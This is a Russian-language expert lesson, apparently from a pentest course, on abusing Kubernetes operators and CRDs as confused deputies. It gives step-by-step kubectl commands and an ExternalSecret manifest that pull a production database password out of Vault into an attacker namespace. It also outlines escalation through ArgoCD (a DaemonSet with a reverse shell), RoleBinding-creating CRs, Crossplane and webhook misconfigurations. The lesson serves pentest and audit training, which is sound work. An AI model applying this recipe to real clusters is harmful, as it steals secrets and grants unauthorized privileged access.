---
id: cloud-k8s-operator
title: "Операторы и CRD: злоупотребление контроллерами"
category: cloud
parent: cloud-k8s-deep
difficulty: expert
order: 4
tags: [cloud, kubernetes, operator, crd, controller, rbac, webhook]
prerequisites: [cloud-k8s-deep, cloud-kubernetes-rbac]
useful_for:
  - "Эскалация через операторы и CRD"
  - "Аудит прав контроллеров в кластере"
  - "Пентест платформенных кластеров"
estimated_minutes: 50
summary: "Как устроены операторы и CRD в Kubernetes, почему контроллеры часто имеют избыточные права и как через создание/изменение кастомного ресурса заставить оператор выполнить привилегированное действие."
---

## Задача

До этого мы искали дыры в RBAC и конфигурациях. Но есть путь эскалации, который не требует ломать ничего: **операторы**. Оператор — это контроллер, который расширяет Kubernetes и реагирует на **кастомные ресурсы (CRD)**, приводя реальный мир в соответствие с их состоянием. Оператор запущен под service account с широкими правами, потому что ему нужно создавать поды, секреты, роли. И если ты можешь **создать** такой ресурс — оператор выполнит действие от своего имени.

Цель урока: из права создать кастомный ресурс вытянуть секрет, к которому у тебя самого доступа нет.

## Данные, с которыми работаем

Мы в namespace `attacker` с минимумом прав. В кластере установлен оператор **external-secrets** — он умеет подтягивать секреты из внешнего хранилища (Vault, AWS Secrets Manager) в Kubernetes. Логика оператора: увидел объект `ExternalSecret` → сходил во внешнее хранилище → создал Kubernetes `Secret`.

Это и есть **confused deputy**: оператор имеет право читать внешние секреты, а заявку на чтение подаём мы.

Сначала разведка — какие CRD есть и кто их операторы:

```bash
$ kubectl get crd | grep external-secrets
externalsecrets.external-secrets.io
secretstores.external-secrets.io
clustersecretstores.external-secrets.io
```

## Шаг 1: проверяем, что нам разрешено

Ключевой вопрос — можем ли мы создать `ExternalSecret`:

```bash
$ kubectl auth can-i create externalsecrets.external-secrets.io -n attacker
yes
```

Да. Теперь смотрим, к каким хранилищам имеет доступ оператор. За это отвечает `ClusterSecretStore`:

```bash
$ kubectl get clustersecretstore
NAME            AGE
vault-backend   12d
```

`vault-backend` — оператор умеет ходить в Vault. Осталось указать, **что** оттуда взять.

## Шаг 2: создаём ExternalSecret

Пишем объект, который просит оператора достать `prod/db` → `password` и положить в наш namespace:

```yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: steal
  namespace: attacker
spec:
  refreshInterval: 1m
  secretStoreRef:
    name: vault-backend
    kind: ClusterSecretStore
  target:
    name: stolen-secret
  data:
    - secretKey: password
      remoteRef:
        key: prod/db
        property: password
```

Применяем:

```bash
$ kubectl apply -f es.yaml
externalsecret.external-secrets.io/steal created
```

## Шаг 3: читаем результат

Оператор увидел наш CR, сходил в Vault **от своего имени** и создал в нашем namespace обычный Kubernetes Secret `stolen-secret`. Ждём пару секунд и читаем:

```bash
$ kubectl get secret stolen-secret -n attacker -o jsonpath='{.data.password}' | base64 -d
Prod_DB_S3cret!
```

Мы получили пароль продовой базы, **не имея никакого доступа к Vault и к namespace `prod`**. Вся эскалация — в одном праве `create externalsecrets`.

## Полный прогон от начала до конца

1. Нашли CRD `externalsecrets.external-secrets.io`.
2. Проверили `can-i create` → yes.
3. Нашли `ClusterSecretStore vault-backend`.
4. Создали `ExternalSecret`, ссылающийся на `prod/db`.
5. Оператор создал Secret в нашем namespace → прочитали пароль.

## Если не сработало: другие операторы как цель

Тот же приём работает с любым оператором, который реагирует на CR. Смотри, что оператор **создаёт** из полей твоего CR:

- **CR, влияющий на образ.** Если оператор создаёт Deployment из полей CR, подставь свой образ → выполнение кода.
- **CR, влияющий на serviceAccount.** Если CR позволяет задать `serviceAccountName`, используй привилегированный SA.
- **CR, создающий RoleBinding.** Оператор может выдать тебе права.
- **cert-manager.** CR `Certificate` с `issuerRef` может выпустить сертификат с произвольным CN.
- **ArgoCD.** CR `Application` с произвольным репозиторием → деплой твоего кода в кластер.
- **Crossplane.** CR создаёт облачные ресурсы (IAM-роль, бакет) — прямой путь в аккаунт.

**GitOps-операторы особенно опасны**, потому что они именно **деплоят код**. Сценарий: `can-i create applications.argoproj.io` = yes. Создаёшь `Application`, указывающий на твой публичный Git-репозиторий с `DaemonSet`, который монтирует `hostPath` и запускает reverse shell. ArgoCD синхронизирует его и разворачивает **от своего имени** — привилегированный код в кластере. Одна из самых чистых эскалаций: не ломаешь RBAC, а используешь его по назначению.

## Как найти права оператора

Всё решают права его service account. Смотрим привязки:

```bash
$ kubectl get clusterrolebinding -o json | \
    jq -r '.items[] | select(.subjects[]?.name=="external-secrets") | .roleRef.name'
external-secrets-controller
$ kubectl get clusterrole external-secrets-controller -o json | jq -c '.rules[0]'
{"apiGroups":[""],"resources":["secrets"],"verbs":["get","list","create","update"]}
```

Оператор может читать и создавать секреты. Если бы в привязке стоял `cluster-admin` — он был бы всемогущ. Именно этот вывод определяет, что ты сможешь через CR.

Отдельно проверяй **webhook-мисконфиги**: `failurePolicy: Ignore` позволяет объекту пройти, если валидирующий webhook недоступен; отсутствие проверки `caBundle` — подмена. И не забывай про **`.status` CR** — некоторые операторы пишут туда чувствительные данные.

## Частые ошибки и подводные камни

- **Считать CRD безобидным.** CRD — это API, а оператор — привилегированный исполнитель, реагирующий на ваши объекты.
- **Не проверять SA оператора.** Именно его права определяют, что вы сможете сделать через CR.
- **Путать validating и mutating webhook.** Первый отклоняет объект, второй меняет — у них разные слабости.
- **Забывать про cluster-scoped CRD.** Такой ресурс может создавать объекты в любом namespace.
- **Пробовать destructive CR.** Некоторые операторы удаляют ресурсы — согласуйте перед экспериментом.

## Что мы теперь знаем

- Оператор — привилегированный исполнитель, реагирующий на **твои** CR.
- Право `create <crd>` может дать действие с правами оператора (confused deputy).
- external-secrets подтягивает внешние секреты; ArgoCD деплоит код; Crossplane создаёт облачные ресурсы.
- Права оператора определяются его SA и ClusterRole/ClusterRoleBinding.
- Поля CR (образ, `serviceAccountName`, volume) влияют на то, что оператор создаст.
- `failurePolicy: Ignore` и cross-namespace ссылки расширяют твои возможности.

## На что смотреть дальше

- **k8s-image-supply-chain**: подмена образов, в том числе самих операторов.
- **runc-escape-deep**: побег из контейнера, если оператор развернул привилегированный под.
- **cloud-privesc-iam**: что делать с облачными ресурсами, созданными через Crossplane.

## Квиз

Проверь себя.

```quiz
- question: "Почему оператор — цель для эскалации?"
  options:
    - "Он действует от имени привилегированного SA, реагируя на ваши CR"
    - "Он не имеет никаких прав"
    - "Он только читает логи"
    - "Он работает вне кластера"
  answer: 0
  explanation: "Оператор reconcile-ит CR и создаёт ресурсы с правами своего SA."
- question: "Что делает external-secrets при создании ExternalSecret?"
  options:
    - "Читает секрет из внешнего хранилища и создаёт Kubernetes Secret"
    - "Удаляет все секреты"
    - "Создаёт NetworkPolicy"
    - "Меняет RBAC кластера"
  answer: 0
  explanation: "Оператор подтягивает секрет из внешнего хранилища в кластер."
- question: "Чем опасен webhook с failurePolicy: Ignore?"
  options:
    - "Валидация может быть пропущена при недоступности webhook"
    - "Он ускоряет работу кластера"
    - "Он шифрует данные"
    - "Он создаёт CRD"
  answer: 0
  explanation: "Ignore позволяет объекту пройти, если webhook недоступен."
- question: "Как найти права оператора?"
  options:
    - "Проверить его service account и привязанные ClusterRole/ClusterRoleBinding"
    - "Посмотреть логи его пода"
    - "Прочитать ConfigMap"
    - "Выполнить kubectl top"
  answer: 0
  explanation: "Права определяются SA оператора и его rolebindings."
- question: "Почему GitOps-оператор (ArgoCD/Flux) особенно опасен?"
  options:
    - "Он деплоит код из указанного вами источника от своего имени"
    - "Он только собирает метрики"
    - "Он не имеет прав"
    - "Он работает только с секретами"
  answer: 0
  explanation: "Application/Kustomization задаёт источник и назначение деплоя — вы контролируете код."
```

## Куда дальше

В следующем уроке мы поднимемся на уровень **рантайма контейнеров** — runc, containerd, CRI-O — и разберём побеги на уровне самого движка. А пока главное запомни: **оператор — это привилегированный исполнитель по твоей заявке**; вопрос не «что я могу», а «что оператор сделает, если я создам такой CR».

## Где пригодится

- **Пентест:** платформенные кластеры с операторами.
- **Red team:** эскалация через CRD.
- **Blue team:** аудит прав операторов и RBAC на CRD.
- **Сертификация:** CKS.
